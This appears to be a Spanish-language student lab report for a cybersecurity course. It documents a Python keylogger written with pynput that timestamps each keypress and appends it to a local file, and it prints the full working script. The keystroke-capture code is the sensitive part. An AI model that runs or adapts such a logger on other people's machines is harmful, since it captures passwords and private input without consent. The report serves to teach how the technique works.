01

Objetivos de la Práctica

Objetivo General: Implementar y documentar un programa basado en event hooks y callbacks que permita registrar eventos de teclado, asociarlos temporalmente y almacenar la telemetría generada, con el fin de comprender el funcionamiento técnico de una técnica de captura de entrada y reconocer sus implicaciones dentro de la ciberseguridad.

02

Desarrollo

Se desarrolló un programa en Python utilizando la biblioteca pynput para interceptar las pulsaciones de teclado mediante event hooks. Cada evento registrado incluye:

  • Marca temporal con precisión de milisegundos.
  • Identificador secuencial único (evento_001, evento_002, etc.).
  • Nombre de la tecla pulsada (incluyendo teclas especiales).

La información se almacena de forma persistente en un archivo local (registro_teclas.txt) mediante escritura en modo append, garantizando que los registros no se pierdan al finalizar la ejecución. El programa se detiene de forma controlada al detectar la tecla ESC.

Esta implementación permite determinar cuándo ocurrió cada evento, en qué orden y cuánto tiempo transcurrió entre ellos, cumpliendo los requisitos de persistencia del registro y asociación temporal solicitados en la actividad.

03

Código Fuente del Script

A continuación se presenta el código implementado para la actividad:


import os
from datetime import datetime
from pynput.keyboard import Key, Listener

directorio_script = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(directorio_script, "registro_teclas.txt")

contador_eventos = 0

def obtener_nombre_tecla(key):
    try:
        if key.char is not None:
            return key.char
        return str(key).replace("Key.", "")
    except AttributeError:
        return str(key).replace("Key.", "")

def on_press(key):
    global contador_eventos
    contador_eventos += 1
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    
    id_evento = f"evento_{contador_eventos:03d}"
    
    tecla = obtener_nombre_tecla(key)
    
    linea_log = f"{timestamp} | PRESS | {id_evento} [{tecla}]\n"
    
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(linea_log)

def on_release(key):
    if key == Key.esc:
        return False

print("--> Registrando eventos con marca temporal. Presiona ESC para salir.")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
04

Conclusiones

Se implementó exitosamente un registrador de eventos de teclado basado en event hooks. El programa cumple con los requisitos de persistencia del registro y asociación temporal, permitiendo reconstruir la secuencia exacta de interacción del usuario a partir de timestamps e identificadores secuenciales.

La actividad permitió comprender de forma práctica el funcionamiento técnico de una técnica clásica de captura de entrada y sus implicaciones en ciberseguridad: la facilidad de implementación, la discreción del proceso y la riqueza de información que puede obtenerse a partir de una simple secuencia de pulsaciones.
